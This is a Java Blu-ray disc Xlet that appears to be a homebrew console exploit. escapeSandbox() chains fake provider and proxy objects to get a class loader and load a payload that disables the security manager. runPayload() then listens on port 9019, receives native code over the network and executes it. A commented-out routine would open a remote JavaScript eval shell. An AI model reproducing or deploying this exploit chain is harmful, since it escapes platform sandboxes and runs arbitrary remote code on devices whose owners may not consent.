package org.homebrew;

import java.io.*;

import java.util.*;

import java.awt.*;
import java.net.*;

import javax.media.*;

import javax.tv.xlet.*;

import org.bluray.ui.event.HRcEvent;

import org.dvb.event.UserEvent;

import org.havi.ui.*;

//import org.mozilla.javascript.*;


public class MyXlet implements Xlet, ControllerListener {

    private HScene scene;
    private Container gui;
    private XletContext context;
    private final ArrayList messages = new ArrayList();

    /*public void runJSServer(int port)
    {
        Context ctx = Context.enter();
        ctx.setOptimizationLevel(-1);
        Scriptable scope = ctx.initStandardObjects();
        ctx.evaluateString(scope, "function doEval(s) { try { try { return '' + (_ = eval(s)); } catch(e0) { if(e0.javaException) { var sw = new java.io.StringWriter(); e0.javaException.printStackTrace(new java.io.PrintWriter(sw)); return ''+sw; } return '' + e0 + '\\n' + e0.stack; } } catch(e) { return '' + e + '\\n' + e.stack; } } (function() { var sock = (new java.net.ServerSocket("+port+")).accept(); var fin = sock.getInputStream(); var fout = sock.getOutputStream(); while(true) { fout.write(62); fout.write(32); var s = ''; var i; while((i = fin.read()) != 10) s += String.fromCharCode(i); var ans = doEval(s); for(var i = 0; i < ans.length; i++) fout.write(ans.charCodeAt(i)); fout.write(10); } })()", "<string>", 1, null);
    }*/

    public void escapeSandbox() throws Exception
    {
        FakeProvider fp = new FakeProvider("", 0, "");
        Interfaces.CService cs = new Interfaces.CService(fp);
        fp.setService(cs);
        cs.setType("fakeType");
        cs.setAlgorithm("fakeAlgorithm");
        cs.setClassName("java.net.URLClassLoader");
        fp.installFakeAccessor();
        FakeIxcProxy ixc = new FakeIxcProxy(cs);
        ClassLoader ldr = (ClassLoader)ixc.pInvokeMethod(new Object[]{new java.net.URL[]{new java.net.URL("file:///app0/bdjstack/lib/ext/../../../../disc/BDMV/JAR/00000.jar")}}, "newInstance", "(Ljava/lang/Object;)Ljava/lang/Object;");
        ldr.loadClass("org.homebrew.Payload").newInstance(); //System.setSecurityManager(null)
        fp.installRealAccessor();
    }

    public void runPayload(int port) throws Exception
    {
        java.net.ServerSocket sock = new java.net.ServerSocket(port);
        byte[] payload = NativeUtils.readResource(sock.accept().getInputStream());
        NativeStuff.callFunction(NativeStuff.writePayload(payload), NativeUtils.dlsym(0x2001, "sceKernelDlsym"), 0, 0, 0, 0, 0);
    }

    public void initXlet(XletContext context) {
        this.context = context;
        
// START: Code required for text output.

        scene = HSceneFactory.getInstance().getDefaultHScene();

        try {
            gui = new Screen(messages);

            gui.setSize(1920, 1080); // BD screen size
            scene.add(gui, BorderLayout.CENTER);

// END: Code required for text output.

            messages.add("Hello World!");
            try
            {
                //runJSServer(4321);
                escapeSandbox();
                runPayload(9019);
            }
            catch(Throwable e)
            {
                printStackTrace(e);
            }

        } catch (Throwable e) {
            messages.add(e.getMessage());
        }
        scene.validate();
    }

    private void printStackTrace(Throwable e)
    {
        StringWriter sw = new StringWriter();
        PrintWriter pw = new PrintWriter(sw);
        e.printStackTrace(pw);
        String trace = sw.toString();
        if(trace.charAt(trace.length()-1) != '\n')
            trace += '\n';
        String line = "";
        for(int i = 0; i < trace.length(); i++)
        {
            char x = trace.charAt(i);
            if(x == '\n')
            {
                messages.add(line);
                line = "";
            }
            else
                line += x;
        }
    }

// Don't touch any of the code from here on.

    public void startXlet() {
        gui.setVisible(true);
        scene.setVisible(true);
        gui.requestFocus();
    }

    public void pauseXlet() {
        gui.setVisible(false);
    }

    public void destroyXlet(boolean unconditional) {
        scene.remove(gui);
        scene = null;
    }

    /**
     * Subclasses should override this if they're interested in getting
     * this event.
     **/
    protected void numberKeyPressed(int value){}

    /**
     * Subclasses should override this if they're interested in getting
     * this event.
     **/
    protected void colorKeyPressed(int value){}

    /**
     * Subclasses should override this if they're interested in getting
     * this event.
     **/
    protected void popupKeyPressed(){}

    /**
     * Subclasses should override this if they're interested in getting
     * this event.
     **/
    protected void enterKeyPressed(){}

    /**
     * Subclasses should override this if they're interested in getting
     * this event.
     **/
    protected void arrowLeftKeyPressed(){}

    /**
     * Subclasses should override this if they're interested in getting
     * this event.
     **/
    protected void arrowRightPressed(){}

    /**
     * Subclasses should override this if they're interested in getting
     * this event.
     **/
    protected void arrowUpPressed(){}

    /**
     * Subclasses should override this if they're interested in getting
     * this event.
     **/
    protected void arrowDownPressed(){}

    public void controllerUpdate(ControllerEvent arg0) {
        // TODO Auto-generated method stub
        
    }
}
